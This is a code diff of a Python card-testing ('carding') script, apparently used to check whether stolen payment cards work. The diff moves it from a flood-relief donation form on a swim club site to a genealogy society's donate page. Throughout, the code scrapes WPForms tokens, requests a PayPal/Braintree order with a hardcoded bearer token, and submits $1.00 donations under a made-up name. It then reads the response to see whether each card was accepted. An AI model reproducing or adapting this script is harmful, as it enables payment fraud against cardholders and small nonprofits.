@@ -64,7 +64,7 @@ def Tele(ccx):
     d2 = random.randint(1, 99)
     
     headers = {
-        'authority': 'murraywoodswimandracquetclub.org',
+        'authority': 'connecticutancestry.org',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
@@ -80,31 +80,27 @@ def Tele(ccx):
         'user-agent': user,
     }
     
-    response = session.get(
-        'https://murraywoodswimandracquetclub.org/donate-to-the-salvation-army-texas-flood-relief-fund/',
-        headers=headers,
-    )
+    response = session.get('https://connecticutancestry.org/donate/', headers=headers)
     
     id = re.search(r'name="wpforms\[id\]" value="(.*?)"', response.text).group(1)
     page = re.search(r'name="page_id" value="(.*?)"', response.text).group(1)
     post = re.search(r'name="wpforms\[post_id\]" value="(.*?)"', response.text).group(1)
     nonce = re.search(r'"create":"(.*?)"', response.text).group(1)
-    tok = re.search(r'data-formid="8067" method="post" enctype="multipart/form-data" action="/donate-to-the-salvation-army-texas-flood-relief-fund/" autocomplete="off" data-token="(.*?)"', response.text).group(1)
+    tok = re.search(r'data-formid="1163" method="post" enctype="multipart/form-data" action="/donate/" data-token="(.*?)"', response.text).group(1)
     #print(tok)
     
     cookies = {
-        'burst_uid': 'c036e38a8a39b5bf299104431879ffdb',
-        '_wpfuuid': '46e6dabc-f2aa-4d2e-8e03-afc1bddb8937',
+        '_wpfuuid': '1bd72860-c261-4e34-88db-fd6bbc3bf568',
     }
     
     headers = {
-        'authority': 'murraywoodswimandracquetclub.org',
+        'authority': 'connecticutancestry.org',
         'accept': '*/*',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary84pkJSjaLSFb2bO1',
-        # 'cookie': 'burst_uid=c036e38a8a39b5bf299104431879ffdb; _wpfuuid=46e6dabc-f2aa-4d2e-8e03-afc1bddb8937',
-        'origin': 'https://murraywoodswimandracquetclub.org',
-        'referer': 'https://murraywoodswimandracquetclub.org/donate-to-the-salvation-army-texas-flood-relief-fund/',
+        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary1QO7l7j61rjDlWv9',
+        # 'cookie': '_wpfuuid=1bd72860-c261-4e34-88db-fd6bbc3bf568',
+        'origin': 'https://connecticutancestry.org',
+        'referer': 'https://connecticutancestry.org/donate/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -119,21 +115,21 @@ def Tele(ccx):
     }
     
     files = {
-        'wpforms[fields][1][first]': (None, f'{first_name}'),
-        'wpforms[fields][1][last]': (None, f'{last_name}'),
-        'wpforms[fields][5]': (None, ''),
-        'wpforms[fields][4]': (None, ''),
+        'wpforms[fields][1]': (None, f'{first_name} {last_name}'),
+        'wpforms[fields][7]': (None, ''),
+        'wpforms[fields][6]': (None, ''),
         'wpforms[fields][2]': (None, f'yellhtetgaung{nr}@gmail.com'),
         'wpforms[fields][3]': (None, '1.00'),
-        'wpforms[fields][13][orderID]': (None, ''),
-        'wpforms[fields][13][subscriptionID]': (None, ''),
-        'wpforms[fields][13][subscriptionProcessorID]': (None, ''),
-        'wpforms[fields][13][source]': (None, ''),
-        'wpforms[fields][13][fastlane_token]': (None, ''),
-        'wpforms[fields][13][cardname]': (None, 'Yell Htet'),
+        'wpforms[fields][4]': (None, 'Donation'),
+        'wpforms[fields][5][orderID]': (None, ''),
+        'wpforms[fields][5][subscriptionID]': (None, ''),
+        'wpforms[fields][5][subscriptionProcessorID]': (None, ''),
+        'wpforms[fields][5][source]': (None, ''),
+        'wpforms[fields][5][fastlane_token]': (None, ''),
+        'wpforms[fields][5][cardname]': (None, 'Yell Htet'),
         'wpforms[id]': (None, f'{id}'),
-        'page_title': (None, 'Donate to the Salvation Army Texas Relief Fund'),
-        'page_url': (None, 'https://murraywoodswimandracquetclub.org/donate-to-the-salvation-army-texas-flood-relief-fund/'),
+        'page_title': (None, 'Donate'),
+        'page_url': (None, 'https://connecticutancestry.org/donate/'),
         'url_referer': (None, 'https://www.google.com/'),
         'page_id': (None, f'{page}'),
         'wpforms[post_id]': (None, f'{post}'),
@@ -143,7 +139,7 @@ def Tele(ccx):
     }
     
     response = session.post(
-        'https://murraywoodswimandracquetclub.org/wp-admin/admin-ajax.php',
+        'https://connecticutancestry.org/wp-admin/admin-ajax.php',
         params=params,
         #cookies=cookies,
         headers=headers,
@@ -157,11 +153,11 @@ def Tele(ccx):
         'authority': 'cors.api.paypal.com',
         'accept': '*/*',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'authorization': 'Bearer A21AAP9g4K2rc_IPDw3arXSQH6dCWQg2XBPgCwpTFL3_zv5xnpTnUTCf8pQI51iYVKoVJcf9dPHdBCBuIiPvoU6Cj559uHW8A',
+        'authorization': 'Bearer A21AAOPVcctnKVFya5XrNwJ2aHrzgQxd6dVcMEwGiaVwJsuVEXt6C2opYztwb76-i1OdTuy-lelAztrd79_IqHpSizUkQ6l0Q',
         'braintree-sdk-version': '3.32.0-payments-sdk-dev',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
-        'paypal-client-metadata-id': 'e1890f602972faec7aec67763a5e398f',
+        'paypal-client-metadata-id': '3e71b2ceccb9ce52c86355bf9f525071',
         'referer': 'https://assets.braintreegateway.com/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
@@ -204,18 +200,17 @@ def Tele(ccx):
     #print(token)
     
     cookies = {
-        'burst_uid': 'c036e38a8a39b5bf299104431879ffdb',
-        '_wpfuuid': '46e6dabc-f2aa-4d2e-8e03-afc1bddb8937',
+        '_wpfuuid': '1bd72860-c261-4e34-88db-fd6bbc3bf568',
     }
     
     headers = {
-        'authority': 'murraywoodswimandracquetclub.org',
+        'authority': 'connecticutancestry.org',
         'accept': 'application/json, text/javascript, */*; q=0.01',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryKdIlcRenla3B9XKa',
-        # 'cookie': 'burst_uid=c036e38a8a39b5bf299104431879ffdb; _wpfuuid=46e6dabc-f2aa-4d2e-8e03-afc1bddb8937',
-        'origin': 'https://murraywoodswimandracquetclub.org',
-        'referer': 'https://murraywoodswimandracquetclub.org/donate-to-the-salvation-army-texas-flood-relief-fund/',
+        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary9Gu9IkA66qkgDADF',
+        # 'cookie': '_wpfuuid=1bd72860-c261-4e34-88db-fd6bbc3bf568',
+        'origin': 'https://connecticutancestry.org',
+        'referer': 'https://connecticutancestry.org/donate/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -227,41 +222,37 @@ def Tele(ccx):
     }
     
     files = {
-        'wpforms[fields][1][first]': (None, f'{first_name}'),
-        'wpforms[fields][1][last]': (None, f'{last_name}'),
-        'wpforms[fields][5]': (None, ''),
-        'wpforms[fields][4]': (None, ''),
+        'wpforms[fields][1]': (None, f'{first_name} {last_name}'),
+        'wpforms[fields][7]': (None, ''),
+        'wpforms[fields][6]': (None, ''),
         'wpforms[fields][2]': (None, f'yellhtetgaung{nr}@gmail.com'),
         'wpforms[fields][3]': (None, '1.00'),
-        'wpforms[fields][13][orderID]': (None, f'{token}'),
-        'wpforms[fields][13][subscriptionID]': (None, ''),
-        'wpforms[fields][13][subscriptionProcessorID]': (None, ''),
-        'wpforms[fields][13][source]': (None, ''),
-        'wpforms[fields][13][fastlane_token]': (None, ''),
-        'wpforms[fields][13][cardname]': (None, 'Yell Htet'),
+        'wpforms[fields][4]': (None, 'Donation'),
+        'wpforms[fields][5][orderID]': (None, f'{token}'),
+        'wpforms[fields][5][subscriptionID]': (None, ''),
+        'wpforms[fields][5][subscriptionProcessorID]': (None, ''),
+        'wpforms[fields][5][source]': (None, ''),
+        'wpforms[fields][5][fastlane_token]': (None, ''),
+        'wpforms[fields][5][cardname]': (None, 'Yell Htet'),
         'wpforms[id]': (None, f'{id}'),
-        'page_title': (None, 'Donate to the Salvation Army Texas Relief Fund'),
-        'page_url': (None, 'https://murraywoodswimandracquetclub.org/donate-to-the-salvation-army-texas-flood-relief-fund/'),
+        'page_title': (None, 'Donate'),
+        'page_url': (None, 'https://connecticutancestry.org/donate/'),
         'url_referer': (None, 'https://www.google.com/'),
         'page_id': (None, f'{page}'),
         'wpforms[post_id]': (None, f'{post}'),
         'wpforms[token]': (None, f'{tok}'),
         'action': (None, 'wpforms_submit'),
-        'start_timestamp': (None, '1777728085'),
-        'end_timestamp': (None, '1777728149'),
+        'start_timestamp': (None, '1777744284'),
+        'end_timestamp': (None, '1777744342'),
     }
     
-    response = session.post(
-        'https://murraywoodswimandracquetclub.org/wp-admin/admin-ajax.php',
-        #cookies=cookies,
-        headers=headers,
-        files=files,
-    )
+    response = session.post('https://connecticutancestry.org/wp-admin/admin-ajax.php', #cookies=cookies, 
+    headers=headers, files=files)
     
     match1 = re.search(r'Form error message<\\/span><p>(.*?)<\\/p>', response.text)
     if match1:
         result = match1.group(1)
-    elif match2 := re.search(r'id=\\"wpforms-confirmation-8067\\"><p>(.*?) <a', response.text):
+    elif match2 := re.search(r'id=\\"wpforms-confirmation-1163\\"><p>(.*?)<\\/p>', response.text):
         result = match2.group(1)
     else:
         result = token
